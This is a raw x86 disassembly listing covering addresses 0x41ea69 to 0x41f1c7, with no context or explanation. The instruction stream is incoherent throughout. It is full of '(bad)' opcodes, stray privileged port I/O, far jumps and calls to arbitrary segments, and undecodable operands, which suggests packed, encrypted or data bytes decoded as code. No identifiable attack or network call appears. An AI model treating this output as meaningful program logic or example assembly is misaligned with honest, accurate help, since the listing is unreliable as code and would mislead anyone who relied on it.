  41ea69:	pop    ss
  41ea6a:	retf   
  41ea6b:	mov    ds:0x50b692b2,eax
  41ea70:	jbe    0x41eac7
  41ea72:	fisttp QWORD PTR [ebp+0x395b3956]
  41ea78:	add    BYTE PTR [edx],bl
  41ea7a:	lahf   
  41ea7b:	jmp    0x41eab4
  41ea7d:	add    BYTE PTR [eax+ecx*4],0xac
  41ea81:	pop    edx
  41ea82:	fwait
  41ea83:	lods   al,BYTE PTR ds:[esi]
  41ea84:	inc    edx
  41ea86:	push   0x4a224df
  41ea8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea8c:	push   ebp
  41ea8d:	stos   DWORD PTR es:[edi],eax
  41ea8e:	inc    edi
  41ea8f:	ret    0x54fa
  41ea92:	cmc    
  41ea93:	xchg   esp,eax
  41ea94:	sub    esi,DWORD PTR [ebx+0x9]
  41ea97:	out    0xe7,eax
  41ea99:	mov    esp,edi
  41ea9b:	sbb    DWORD PTR [edi-0x79],edx
  41ea9e:	push   DWORD PTR [edx-0x12234dee]
  41eaa4:	fmul   DWORD PTR [eax+0x37800828]
  41eaaa:	fwait
  41eaab:	and    al,0x8a
  41eaad:	test   BYTE PTR [ebx+0x73f48ff6],0xef
  41eab4:	test   DWORD PTR [ebp+0xe],edi
  41eab7:	in     eax,dx
  41eab8:	jbe    0x41ea94
  41eaba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eabb:	mov    esp,0x7d5e5628
  41eac0:	mov    ch,0xb1
  41eac2:	inc    esi
  41eac3:	aaa    
  41eac4:	ins    DWORD PTR es:[edi],dx
  41eac5:	xchg   edx,eax
  41eac6:	xor    ecx,DWORD PTR ds:0x73cd01fc
  41eacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eacd:	mov    dh,0x2f
  41eacf:	push   cs
  41ead0:	xchg   BYTE PTR [ebx+0x3b],ch
  41ead3:	push   eax
  41ead4:	mov    fs,ebp
  41ead6:	sbb    al,0x2c
  41ead8:	mov    eax,0xb2efb552
  41eadd:	sub    bl,BYTE PTR [esi]
  41eadf:	test   eax,0xe24dfc79
  41eae4:	mov    al,0x28
  41eae6:	call   esi
  41eae8:	push   esp
  41eae9:	inc    ebp
  41eaea:	mov    edi,0x6bb2738
  41eaef:	adc    eax,0x3c2c25e9
  41eaf4:	mov    dl,0xbe
  41eaf6:	jno    0x41eac0
  41eaf8:	call   0x5dba2f54
  41eafd:	and    ecx,DWORD PTR [ebx-0x7c]
  41eb00:	mov    ebx,0xb834ca10
  41eb05:	ins    BYTE PTR es:[edi],dx
  41eb06:	(bad)  
  41eb08:	clc    
  41eb09:	push   ss
  41eb0a:	inc    ecx
  41eb0b:	adc    esi,DWORD PTR [ecx+0x31]
  41eb0e:	es test dh,dl
  41eb11:	pop    esi
  41eb12:	fild   QWORD PTR [eax]
  41eb15:	arpl   WORD PTR [edx+0x75cd8bbb],si
  41eb1b:	out    0x69,al
  41eb1d:	js     0x41eb97
  41eb1f:	rcl    esi,1
  41eb21:	cmp    DWORD PTR ds:0xdbc32ccd,edi
  41eb27:	dec    eax
  41eb28:	loop   0x41eaff
  41eb2a:	pop    esi
  41eb2b:	int3   
  41eb2c:	lods   al,BYTE PTR ds:[esi]
  41eb2d:	xchg   edx,eax
  41eb2e:	int3   
  41eb2f:	bound  ebp,QWORD PTR [esi-0x76dd0034]
  41eb35:	sbb    BYTE PTR [eax-0x58dcd594],ch
  41eb3b:	int    0x32
  41eb3d:	loop   0x41eb7e
  41eb3f:	pop    DWORD PTR [edx]
  41eb41:	das    
  41eb42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb43:	xchg   ecx,eax
  41eb44:	fwait
  41eb45:	xor    dh,BYTE PTR [bp+di]
  41eb48:	push   ecx
  41eb49:	sub    eax,0x3c4aea3c
  41eb4e:	int    0x6b
  41eb50:	mov    edx,0x2e50abdc
  41eb55:	test   al,0x4c
  41eb57:	out    0xc1,eax
  41eb59:	dec    ebp
  41eb5a:	and    bh,dl
  41eb5c:	stos   WORD PTR es:[edi],ax
  41eb5e:	repz fisub DWORD PTR [ecx+0x3c]
  41eb62:	inc    ecx
  41eb63:	fld    DWORD PTR [esi+0x22d2b73]
  41eb69:	mov    edx,0xc23a81d0
  41eb6e:	sub    ebx,DWORD PTR [ecx]
  41eb70:	inc    eax
  41eb71:	fistp  DWORD PTR [edi]
  41eb73:	stos   BYTE PTR es:[edi],al
  41eb74:	xchg   ebp,eax
  41eb75:	and    bh,BYTE PTR [esi-0x2e661005]
  41eb7b:	jbe    0x41eba8
  41eb7d:	xor    eax,0x77889a3f
  41eb82:	popa   
  41eb83:	aas    
  41eb84:	call   0xa4a7:0xb3959e23
  41eb8b:	aad    0x56
  41eb8d:	sub    al,0xc8
  41eb8f:	repz imul esp,DWORD PTR [ebx],0x8f0cf3c0
  41eb96:	in     al,0x1f
  41eb98:	mov    ds:0x4bd6b7e3,eax
  41eb9d:	push   ebx
  41eb9e:	lea    edx,[ecx+0x72]
  41eba1:	jno    0x41eb8a
  41eba3:	retf   
  41eba4:	sbb    eax,0x85962931
  41eba9:	or     BYTE PTR ds:0x64d1cfb4,dh
  41ebaf:	xlat   BYTE PTR ds:[ebx]
  41ebb0:	test   DWORD PTR [ebx],edx
  41ebb2:	xor    ch,BYTE PTR [ecx-0x790f51cd]
  41ebb8:	sar    DWORD PTR [ebx],cl
  41ebba:	jnp    0x41eb66
  41ebbc:	in     eax,0xd3
  41ebbe:	pop    ebx
  41ebbf:	mov    ds:0x8bb0e79a,al
  41ebc4:	mov    DWORD PTR [eiz*1+0x236f873c],ebx
  41ebcb:	mov    al,ds:0x4d4fe59a
  41ebd0:	pusha  
  41ebd1:	pop    esp
  41ebd2:	push   ds
  41ebd3:	mov    ds:0xd11fc4b5,eax
  41ebd8:	dec    esi
  41ebda:	cmp    DWORD PTR [esi],esp
  41ebdc:	push   0x2b732f34
  41ebe1:	idiv   BYTE PTR [edi-0x745021ad]
  41ebe7:	adc    esp,eax
  41ebe9:	jge    0x41eb89
  41ebeb:	jnp    0x41ec39
  41ebed:	adc    DWORD PTR [esi],ebp
  41ebef:	xchg   ecx,eax
  41ebf0:	imul   edx,DWORD PTR [ecx-0x417656f2],0xf739ef32
  41ebfa:	pop    edi
  41ebfb:	cmp    eax,0x58b166bd
  41ec00:	cdq    
  41ec01:	int3   
  41ec02:	dec    ecx
  41ec03:	retf   0xb594
  41ec06:	and    BYTE PTR [ecx],0xba
  41ec09:	rol    BYTE PTR [edi+0x23],0x3a
  41ec0d:	mov    ebp,DWORD PTR [esi-0x79d74997]
  41ec13:	inc    ecx
  41ec14:	ins    DWORD PTR es:[edi],dx
  41ec15:	or     bh,cl
  41ec17:	outs   dx,DWORD PTR ds:[esi]
  41ec18:	leave  
  41ec19:	push   0xc2c08f3b
  41ec1e:	mov    eax,esp
  41ec20:	push   edi
  41ec21:	les    edx,FWORD PTR [eax+0x54d6c87d]
  41ec27:	outs   dx,DWORD PTR ds:[esi]
  41ec28:	pop    esp
  41ec29:	in     al,dx
  41ec2a:	add    BYTE PTR [bx+si-0x11],ch
  41ec2e:	rcl    BYTE PTR [esi+0x66b46dd0],1
  41ec34:	mov    esp,0xff70f8ab
  41ec39:	sbb    dl,dl
  41ec3b:	cmp    dh,0x14
  41ec3e:	and    eax,0x86eacbce
  41ec43:	pop    di
  41ec45:	sub    bh,BYTE PTR [ebx-0xc]
  41ec48:	stc    
  41ec49:	mov    edx,0x2bbca6d4
  41ec4e:	dec    ebx
  41ec4f:	xchg   DWORD PTR [ebx+0x1],edi
  41ec52:	and    al,0xfd
  41ec54:	or     ebp,DWORD PTR [edi]
  41ec56:	sbb    DWORD PTR [edi-0x1a],0x3b
  41ec5a:	ud2    
  41ec5c:	cmc    
  41ec5d:	neg    ebp
  41ec5f:	push   esp
  41ec60:	or     al,0xff
  41ec62:	and    ebx,DWORD PTR [esi-0x9]
  41ec65:	mov    dl,dl
  41ec67:	inc    ecx
  41ec68:	js     0x41ec33
  41ec6a:	push   0xffffffce
  41ec6c:	(bad)  
  41ec6d:	mov    edx,0x9ecbffc6
  41ec72:	jmp    0x41ecc8
  41ec74:	(bad)  
  41ec75:	mov    esi,ecx
  41ec77:	or     edi,DWORD PTR ds:0xcd6f1953
  41ec7d:	jge    0x41ec6d
  41ec7f:	ds cmc 
  41ec81:	imul   ecx,DWORD PTR [ebp+0x74],0xffffff98
  41ec85:	push   ebx
  41ec86:	cld    
  41ec87:	sub    edx,esi
  41ec89:	pop    eax
  41ec8a:	mov    eax,0x71d0e5c2
  41ec8f:	sub    al,0x2d
  41ec92:	and    BYTE PTR [ebx-0x18],dl
  41ec95:	in     eax,0xa7
  41ec97:	inc    ecx
  41ec98:	fistp  QWORD PTR [ebp+0x2e]
  41ec9b:	xor    dh,BYTE PTR [ebx-0x45]
  41ec9e:	ret    0xc782
  41eca1:	xchg   ecx,eax
  41eca2:	push   0x3a
  41eca4:	push   edi
  41eca5:	(bad)  
  41eca7:	repz test DWORD PTR [esi],ebx
  41ecaa:	pop    ebx
  41ecab:	mov    al,ds:0x906278a7
  41ecb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb1:	jnp    0x41ec3e
  41ecb3:	jns    0x41ed28
  41ecb5:	dec    ecx
  41ecb6:	mov    al,ds:0x5248317c
  41ecbb:	aas    
  41ecbc:	test   al,0x98
  41ecbe:	push   esp
  41ecbf:	outs   dx,BYTE PTR cs:[esi]
  41ecc1:	adc    DWORD PTR [edi+0x59],0x7a
  41ecc5:	test   BYTE PTR [edx+0x1f],ah
  41ecc8:	or     ch,dl
  41ecca:	lods   al,BYTE PTR ds:[esi]
  41eccb:	pop    esp
  41eccc:	mov    ebx,edi
  41ecce:	jmp    0xc6aa:0x6a2c168f
  41ecd5:	and    al,0xe4
  41ecd7:	add    dh,BYTE PTR [eax-0x4624f0d8]
  41ecdd:	xlat   BYTE PTR ds:[ebx]
  41ecde:	les    ebx,FWORD PTR [edx]
  41ece0:	sar    dl,0xf8
  41ece3:	dec    ebx
  41ece4:	test   eax,0x7cf38372
  41ece9:	js     0x41ed5a
  41eceb:	jbe    0x41ed18
  41eced:	dec    edi
  41ecee:	and    eax,DWORD PTR [eax+0x21]
  41ecf1:	loope  0x41ec74
  41ecf3:	int    0x9
  41ecf5:	xchg   ebx,eax
  41ecf6:	popa   
  41ecf7:	retf   
  41ecf8:	iret   
  41ecf9:	jmp    DWORD PTR [eax]
  41ecfb:	sbb    BYTE PTR [edi],cl
  41ecfd:	xlat   BYTE PTR ds:[ebx]
  41ecfe:	dec    ebp
  41ecff:	jb     0x41ed4b
  41ed01:	mov    ecx,DWORD PTR [eax]
  41ed03:	ret    0xb073
  41ed06:	enter  0x702,0xfe
  41ed0a:	dec    eax
  41ed0b:	imul   ebp,DWORD PTR [ebp+0x1eb40113],0xfc41a231
  41ed15:	out    0xaf,eax
  41ed17:	call   0xce85:0xcdb4c936
  41ed1e:	or     eax,DWORD PTR [esi-0x11]
  41ed21:	(bad)  
  41ed22:	mov    ecx,0xaf673127
  41ed27:	adc    eax,0x323dd7a4
  41ed2c:	push   eax
  41ed2d:	pop    esp
  41ed2e:	adc    ebp,0xffffffa7
  41ed31:	aas    
  41ed32:	xsaveopt [esp+edi*2+0x73]
  41ed37:	inc    ebx
  41ed38:	sbb    DWORD PTR [esi+0x26],eax
  41ed3b:	pop    esi
  41ed3c:	(bad)  
  41ed3d:	in     eax,dx
  41ed3e:	dec    edi
  41ed3f:	lock jmp 0x41eced
  41ed42:	push   0xa78ec075
  41ed47:	bound  esi,QWORD PTR [esi]
  41ed49:	xchg   esi,eax
  41ed4a:	hlt    
  41ed4b:	push   esi
  41ed4c:	test   BYTE PTR [ebx+0x17de9766],0xb2
  41ed53:	(bad)  
  41ed54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed55:	lods   al,BYTE PTR ds:[esi]
  41ed56:	add    eax,0x71363eb6
  41ed5b:	repnz xor DWORD PTR [ebx],ecx
  41ed5e:	jns    0x41ed5e
  41ed60:	push   edi
  41ed61:	jmp    0x41ed03
  41ed63:	and    al,0x20
  41ed65:	shl    esp,0x4e
  41ed68:	or     dh,dl
  41ed6a:	xchg   edx,eax
  41ed6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed6c:	mov    edi,0x3c1087a8
  41ed71:	inc    ebx
  41ed72:	stc    
  41ed73:	pop    gs
  41ed75:	push   eax
  41ed76:	(bad)  [ecx-0x716bc8c9]
  41ed7c:	add    DWORD PTR [ebx],ecx
  41ed7e:	push   0x85cfb235
  41ed83:	loopne 0x41ed6b
  41ed85:	inc    edi
  41ed86:	cdq    
  41ed87:	jno    0x41edf3
  41ed89:	sub    ecx,DWORD PTR [esi+edi*2]
  41ed8c:	(bad)  
  41ed8d:	fistp  DWORD PTR [eax]
  41ed8f:	xor    eax,0x228b3b2
  41ed94:	pop    ss
  41ed95:	mov    ss,WORD PTR ds:[ebp-0x36]
  41ed99:	push   esp
  41ed9a:	enter  0xfd6b,0x8d
  41ed9e:	(bad)  
  41eda0:	in     eax,0x29
  41eda2:	add    DWORD PTR [edi],0xf59cadf7
  41eda8:	lock das 
  41edaa:	stc    
  41edab:	pop    es
  41edac:	(bad)  
  41edad:	outs   dx,BYTE PTR ds:[esi]
  41edae:	mov    ch,0xa0
  41edb0:	(bad)  
  41edb1:	push   ss
  41edb2:	into   
  41edb3:	push   0xffffffde
  41edb5:	dec    eax
  41edb6:	shl    DWORD PTR [esi-0x3b3c32d8],cl
  41edbc:	out    dx,al
  41edbd:	mov    ds:0xe16bdf64,al
  41edc2:	push   0xffffffce
  41edc4:	push   cs
  41edc5:	nop    ecx
  41edc8:	sti    
  41edc9:	rcr    bh,0xc1
  41edcc:	xchg   esi,eax
  41edcd:	add    al,0x6
  41edcf:	test   bl,ah
  41edd1:	mov    eax,ds:0xe3154f7e
  41edd6:	mov    ah,0xf7
  41edd8:	pop    ds
  41edd9:	test   ah,bl
  41eddb:	sbb    dl,bl
  41eddd:	jns    0x41ee29
  41eddf:	xchg   ebp,eax
  41ede0:	push   esi
  41ede1:	push   esp
  41ede2:	cmp    al,0x3f
  41ede4:	call   0x39f3b38b
  41ede9:	loop   0x41edd0
  41edeb:	mov    dl,0xef
  41eded:	push   es
  41edee:	mov    edx,0xcfe4c1ba
  41edf3:	xchg   esi,eax
  41edf4:	retf   0xb87c
  41edf7:	fist   DWORD PTR [ebx]
  41edf9:	mov    al,ds:0x64eff603
  41edfe:	xchg   ecx,eax
  41edff:	mov    edx,DWORD PTR ds:0x6888db6e
  41ee05:	jne    0x41ee73
  41ee07:	js     0x41ee48
  41ee09:	sti    
  41ee0a:	xchg   ebx,eax
  41ee0b:	add    eax,0xfd0bb1e7
  41ee10:	sub    al,0xa7
  41ee12:	push   ebx
  41ee13:	adc    al,0x31
  41ee15:	aaa    
  41ee16:	inc    ebx
  41ee17:	xor    DWORD PTR [ebp+0x36ff8939],ebp
  41ee1d:	cmp    DWORD PTR [edi-0x2bfd6d7e],edx
  41ee23:	or     DWORD PTR [edx],esi
  41ee25:	mov    cl,0x2e
  41ee27:	dec    esi
  41ee28:	call   0xabc711e
  41ee2d:	ror    BYTE PTR [ebx+0x3d],cl
  41ee30:	ins    BYTE PTR es:[edi],dx
  41ee31:	sbb    BYTE PTR [edi+0x48],bl
  41ee34:	or     DWORD PTR [ebp-0x328132b0],edx
  41ee3a:	repz xor DWORD PTR [edi-0x6e],ebp
  41ee3e:	push   ds
  41ee3f:	icebp  
  41ee40:	out    dx,eax
  41ee41:	popa   
  41ee42:	or     ah,0xe7
  41ee45:	adc    eax,esi
  41ee47:	retf   0x1de5
  41ee4a:	fldcw  WORD PTR [edi-0x50]
  41ee4d:	aas    
  41ee4e:	cmp    BYTE PTR [esi-0x44eda323],dl
  41ee54:	retf   
  41ee55:	fstp   QWORD PTR [esi-0x2f]
  41ee58:	repz in eax,dx
  41ee5a:	ja     0x41edfd
  41ee5c:	ret    
  41ee5d:	daa    
  41ee5e:	dec    eax
  41ee5f:	(bad)
  41ee63:	add    eax,0x94c840ba
  41ee68:	push   edi
  41ee69:	mov    ds:0x6ff1593a,al
  41ee6e:	adc    edi,ebx
  41ee70:	mul    BYTE PTR [edi-0xa50df68]
  41ee76:	fdivr  QWORD PTR [eax+ecx*1-0x3f]
  41ee7a:	rcl    BYTE PTR [edi+0x3cfdcf2e],cl
  41ee80:	div    BYTE PTR [edx]
  41ee82:	push   ebp
  41ee83:	push   ss
  41ee84:	(bad)  
  41ee85:	(bad)  
  41ee86:	pushf  
  41ee87:	ss dec ebp
  41ee89:	sbb    DWORD PTR [eax+0x1b],esp
  41ee8c:	xor    eax,0xff98de9d
  41ee91:	ds jo  0x41ee98
  41ee94:	lahf   
  41ee95:	data16 mov ds:0xf29fbe8c,al
  41ee9b:	clc    
  41ee9c:	or     DWORD PTR [ecx+eax*4+0x17aecd10],eax
  41eea3:	imul   ebx,DWORD PTR [edi],0x44878fd8
  41eea9:	int    0x1a
  41eeab:	hlt    
  41eeac:	push   esp
  41eead:	pushf  
  41eeae:	leave  
  41eeaf:	dec    edi
  41eeb0:	cs lock ret 0xee83
  41eeb5:	out    0x51,eax
  41eeb7:	call   0xebdb0235
  41eebc:	or     DWORD PTR [edi+edx*4-0x3d864fa5],0xffffff9c
  41eec4:	cs lahf 
  41eec6:	cs jno 0x41ef06
  41eec9:	shr    cl,1
  41eecb:	sbb    dl,BYTE PTR [edx-0x28]
  41eece:	push   cs
  41eecf:	sub    BYTE PTR [esi+esi*1+0xa],bh
  41eed3:	xchg   edi,eax
  41eed4:	sub    eax,0x13e67cce
  41eed9:	(bad)  
  41eeda:	out    0x15,eax
  41eedc:	cdq    
  41eedd:	aaa    
  41eede:	int3   
  41eedf:	mov    eax,ds:0xac383958
  41eee4:	jbe    0x41eefa
  41eee6:	daa    
  41eee7:	push   edx
  41eee8:	push   es
  41eee9:	xchg   esp,eax
  41eeea:	fidiv  DWORD PTR [edi-0x1b]
  41eeed:	or     eax,0x732e08ed
  41eef2:	jmp    0x763e:0x925cdc57
  41eef9:	sbb    ecx,DWORD PTR [esi]
  41eefb:	jge    0x41ef70
  41eefd:	sub    ecx,DWORD PTR [ecx]
  41eeff:	pop    ss
  41ef00:	mov    ?,edi
  41ef02:	mov    eax,0x30def358
  41ef07:	jle    0x41eeb2
  41ef09:	push   0x5f5f9a21
  41ef0e:	fdiv   QWORD PTR [ebp+0x9]
  41ef11:	xor    BYTE PTR [edi-0x34],ah
  41ef14:	mov    DWORD PTR [ecx],esi
  41ef16:	pop    es
  41ef17:	inc    ebp
  41ef18:	sbb    bh,dh
  41ef1a:	pushf  
  41ef1b:	push   eax
  41ef1c:	out    dx,eax
  41ef1d:	sub    bh,BYTE PTR ds:0xf0b80a45
  41ef23:	loope  0x41eeb5
  41ef25:	mov    dl,0x69
  41ef27:	and    edx,DWORD PTR [ebx]
  41ef29:	sub    BYTE PTR [edi+0x19065b14],0xcd
  41ef30:	mov    cl,0xc2
  41ef32:	xchg   edi,eax
  41ef33:	dec    edi
  41ef34:	mov    ds:0xd3dbeac8,al
  41ef39:	xchg   ecx,eax
  41ef3a:	xchg   ebp,eax
  41ef3b:	add    esi,DWORD PTR [ecx+ebp*4+0x1123bd8b]
  41ef42:	fwait
  41ef43:	push   esi
  41ef44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef45:	clc    
  41ef46:	add    eax,0x6658a37b
  41ef4b:	push   edx
  41ef4c:	push   ss
  41ef4d:	das    
  41ef4e:	jo     0x41ef16
  41ef50:	mov    ebp,0x6dd0fc3
  41ef55:	adc    BYTE PTR [edi-0x7a],bh
  41ef58:	or     ah,BYTE PTR [edx-0xbde26ea]
  41ef5e:	pop    edi
  41ef5f:	test   al,0xd
  41ef61:	xor    edx,DWORD PTR [edi+ecx*2]
  41ef64:	sti    
  41ef65:	pop    esi
  41ef66:	bound  ecx,QWORD PTR [edx-0x56]
  41ef69:	out    0x2f,al
  41ef6b:	cmp    eax,esp
  41ef6d:	jmp    DWORD PTR [edx]
  41ef6f:	gs push ds
  41ef71:	cmc    
  41ef72:	inc    ebx
  41ef73:	popa   
  41ef74:	jecxz  0x41eff1
  41ef76:	push   cs
  41ef77:	sbb    edi,DWORD PTR [ebx+0xdb3a970]
  41ef7d:	hlt    
  41ef7e:	test   ah,bh
  41ef80:	rcl    DWORD PTR [edx-0x9],0x62
  41ef84:	fnsave [eax-0x54]
  41ef87:	iret   
  41ef88:	ja     0x41ef0a
  41ef8a:	jecxz  0x41efaf
  41ef8c:	fisttp DWORD PTR [ecx-0x1482c641]
  41ef92:	xor    dl,bl
  41ef94:	xor    dh,al
  41ef96:	xchg   edx,eax
  41ef97:	xchg   bh,dl
  41ef99:	fisttp WORD PTR [eax+0xf60e1a5]
  41ef9f:	xchg   edx,eax
  41efa0:	inc    edx
  41efa1:	sub    BYTE PTR [edx],bh
  41efa3:	imul   edx,DWORD PTR [ecx],0x52
  41efa6:	rol    DWORD PTR [eax+0x7e62109a],0xe4
  41efad:	mov    eax,ds:0x9793e6e7
  41efb2:	aas    
  41efb3:	mov    edi,0xee200355
  41efb8:	dec    esp
  41efb9:	cmp    BYTE PTR [eax+ecx*4+0x3],ah
  41efbd:	sub    cl,ah
  41efbf:	fstp   QWORD PTR [edx]
  41efc1:	mov    ecx,0x5a7ca55c
  41efc6:	lds    eax,FWORD PTR [esi+edi*2+0x4a]
  41efca:	push   cs
  41efcb:	inc    ebp
  41efcc:	pop    ds
  41efcd:	shr    DWORD PTR [esi-0xc2eea03],0x20
  41efd4:	dec    BYTE PTR [ecx-0x5d]
  41efd7:	mov    bl,0x15
  41efd9:	ss jmp 0xdedda3b7
  41efdf:	icebp  
  41efe0:	push   0xfffffff1
  41efe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efe3:	jae    0x41f059
  41efe5:	cmc    
  41efe6:	push   0x20
  41efe8:	scas   al,BYTE PTR es:[edi]
  41efe9:	hlt    
  41efea:	pop    esp
  41efeb:	cmc    
  41efec:	mov    ds:0x86867040,eax
  41eff1:	pop    es
  41eff2:	push   ebp
  41eff3:	test   dh,0xbc
  41eff6:	cmp    bl,al
  41eff8:	xor    al,0x2f
  41effa:	xchg   ebp,eax
  41effb:	xor    al,0xfc
  41effd:	mov    edi,0xa58b2d78
  41f002:	leave  
  41f003:	(bad)  
  41f004:	mov    ds:0xe57d9f2,al
  41f009:	pop    ss
  41f00a:	repnz push ss
  41f00c:	mov    bl,0x9a
  41f00e:	xor    BYTE PTR [edx],dh
  41f010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f011:	sub    edx,esi
  41f013:	jecxz  0x41efc3
  41f015:	sbb    al,0xda
  41f017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f018:	imul   esp,DWORD PTR [edx+0x1f],0x798f6057
  41f01f:	or     esp,DWORD PTR [edx+ebx*2+0x3764ec86]
  41f026:	stos   DWORD PTR es:[edi],eax
  41f027:	or     eax,0x5dfdb597
  41f02c:	out    0xaf,al
  41f02e:	mov    eax,0xf281cb25
  41f033:	push   0x264bacc5
  41f038:	(bad)  
  41f039:	pop    ds
  41f03a:	stos   BYTE PTR es:[edi],al
  41f03b:	cdq    
  41f03c:	je     0x41efff
  41f03e:	lods   al,BYTE PTR ds:[esi]
  41f03f:	mov    dl,0x8f
  41f041:	add    DWORD PTR [edi+ebp*8+0x27659249],0xa6814f87
  41f04c:	dec    edx
  41f04d:	ins    BYTE PTR es:[edi],dx
  41f04e:	sub    DWORD PTR [eax],0xffffffcd
  41f051:	out    0xaa,al
  41f053:	or     BYTE PTR [esi],dl
  41f055:	push   edx
  41f056:	adc    dh,BYTE PTR [ecx+0x6bab0421]
  41f05c:	mov    ah,0x72
  41f05e:	push   ss
  41f05f:	test   BYTE PTR [edi],bh
  41f061:	ins    BYTE PTR es:[edi],dx
  41f062:	push   ds
  41f063:	aas    
  41f064:	pop    esi
  41f065:	add    dh,BYTE PTR [eax-0x3910f56d]
  41f06b:	in     eax,dx
  41f06c:	idiv   DWORD PTR [esi]
  41f06e:	mov    BYTE PTR [esi-0x3d],bl
  41f071:	cdq    
  41f072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f073:	add    al,0xc4
  41f075:	mov    ss,WORD PTR [eax+eax*4]
  41f078:	clc    
  41f079:	mov    esp,0xbf2f3921
  41f07e:	mov    esp,esi
  41f080:	xor    edx,esp
  41f082:	aad    0xa0
  41f084:	push   edx
  41f085:	neg    BYTE PTR [edi+0x39378cc4]
  41f08b:	std    
  41f08c:	lods   al,BYTE PTR ds:[esi]
  41f08d:	pop    eax
  41f08e:	test   DWORD PTR [ebx+ebp*8-0x2b26c743],esi
  41f095:	xchg   esi,eax
  41f096:	ds dec esi
  41f098:	inc    ecx
  41f099:	fld    QWORD PTR [edx+0x1]
  41f09c:	(bad)  
  41f09d:	xchg   edx,eax
  41f09e:	stc    
  41f09f:	je     0x41f03c
  41f0a1:	popf   
  41f0a2:	cwde   
  41f0a3:	xbegin 0x36c6d669
  41f0a9:	leave  
  41f0aa:	xchg   edi,eax
  41f0ab:	bound  ebp,QWORD PTR [esi]
  41f0ad:	and    BYTE PTR [edx],al
  41f0af:	pop    edi
  41f0b0:	jns    0x41f0a4
  41f0b2:	aad    0xa0
  41f0b4:	adc    esi,DWORD PTR [edi+eax*4+0x60]
  41f0b8:	jne    0x41f0f0
  41f0ba:	daa    
  41f0bb:	fnstcw WORD PTR [edx-0x63]
  41f0be:	pop    ds
  41f0bf:	mov    esp,0x535ef
  41f0c4:	shr    DWORD PTR [edi],cl
  41f0c6:	mov    esp,0xb0ec3012
  41f0cb:	inc    DWORD PTR [edx-0xa]
  41f0ce:	sub    dl,BYTE PTR [ebx+0x79]
  41f0d1:	jp     0x41f134
  41f0d3:	dec    ebx
  41f0d4:	hlt    
  41f0d5:	or     cl,BYTE PTR [ecx]
  41f0d7:	in     al,0xb
  41f0d9:	cmc    
  41f0da:	jmp    0x1d47:0x437e4d68
  41f0e1:	mov    DWORD PTR [edx+0x258b3c00],edx
  41f0e7:	in     al,dx
  41f0e8:	xchg   edx,eax
  41f0e9:	(bad)  
  41f0ea:	push   ecx
  41f0eb:	inc    eax
  41f0ec:	add    BYTE PTR [ebp+ebx*4+0x1babae9f],0x37
  41f0f4:	sbb    edi,esp
  41f0f6:	cwde   
  41f0f7:	sub    ecx,DWORD PTR [esi]
  41f0f9:	push   edi
  41f0fa:	or     cl,BYTE PTR [eax-0x58]
  41f0fd:	arpl   WORD PTR [ebx-0x4c],dx
  41f100:	pusha  
  41f101:	jle    0x41f17d
  41f103:	leave  
  41f104:	mov    ebp,0xa94f2d08
  41f109:	inc    ecx
  41f10a:	jl     0x41f0c9
  41f10c:	loop   0x41f18d
  41f10e:	lods   eax,DWORD PTR ds:[esi]
  41f10f:	adc    DWORD PTR [edx-0x6fcd90ca],eax
  41f115:	hlt    
  41f116:	push   esi
  41f117:	les    esi,FWORD PTR [ecx+0x696ef325]
  41f11d:	les    eax,FWORD PTR [ebx]
  41f11f:	xor    ah,BYTE PTR [ecx+0x9b2c5a5]
  41f125:	cmp    esp,DWORD PTR [ecx-0x5c9bbdf5]
  41f12b:	add    BYTE PTR [esi],ah
  41f12d:	xchg   ecx,eax
  41f12e:	imul   eax,esi,0x13b6e356
  41f134:	loopne 0x41f16a
  41f136:	pop    ebx
  41f137:	fdivp  st(7),st
  41f139:	les    esi,FWORD PTR [ecx]
  41f13b:	shl    DWORD PTR [ebx],1
  41f13d:	div    DWORD PTR [edx-0x12497050]
  41f143:	mov    ds:0xfd17648b,al
  41f148:	sti    
  41f149:	daa    
  41f14a:	leave  
  41f14b:	cmp    DWORD PTR [eax],eax
  41f14d:	fwait
  41f14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14f:	dec    ecx
  41f150:	jecxz  0x41f115
  41f152:	out    0x59,eax
  41f154:	test   al,0x2d
  41f156:	push   ss
  41f157:	inc    esp
  41f158:	xlat   BYTE PTR ds:[ebx]
  41f159:	lods   al,BYTE PTR ds:[esi]
  41f15a:	sub    DWORD PTR [eax+0x65ee31c2],esi
  41f160:	call   0xe731:0x5c96ca47
  41f167:	jp     0x41f165
  41f169:	xchg   esp,eax
  41f16a:	adc    DWORD PTR [edx-0x4e],esi
  41f16d:	add    DWORD PTR [edx-0x46],ebx
  41f170:	jl     0x41f18d
  41f172:	inc    ecx
  41f173:	shl    DWORD PTR [edx+0x6],cl
  41f176:	mov    al,ds:0xbe376614
  41f17b:	clc    
  41f17c:	adc    eax,0x729a331a
  41f181:	mov    WORD PTR [ecx],?
  41f183:	rcr    edi,cl
  41f185:	cld    
  41f186:	dec    edx
  41f187:	rcr    al,1
  41f189:	popa   
  41f18a:	dec    eax
  41f18b:	push   ds
  41f18c:	out    0x5d,eax
  41f18e:	add    DWORD PTR [edx-0x2a0213ea],ebx
  41f194:	repnz mov bh,0x25
  41f197:	cmp    eax,0x3f7f90f7
  41f19c:	dec    BYTE PTR [eax+0x57587609]
  41f1a2:	mov    edx,0xad7667d9
  41f1a7:	mov    bh,BYTE PTR ss:[ebp+0x7de46f21]
  41f1ae:	adc    bl,al
  41f1b0:	mov    esi,0x5f33a983
  41f1b5:	mov    edi,0xcb09cb41
  41f1ba:	sbb    edi,DWORD PTR [edi+0x3c]
  41f1bd:	lahf   
  41f1be:	xlat   BYTE PTR ds:[ebx]
  41f1bf:	push   0x4f
  41f1c1:	jp     0x41f223
  41f1c3:	cmovge ecx,DWORD PTR [eax+0x25]
  41f1c7:	gs xor eax,ecx
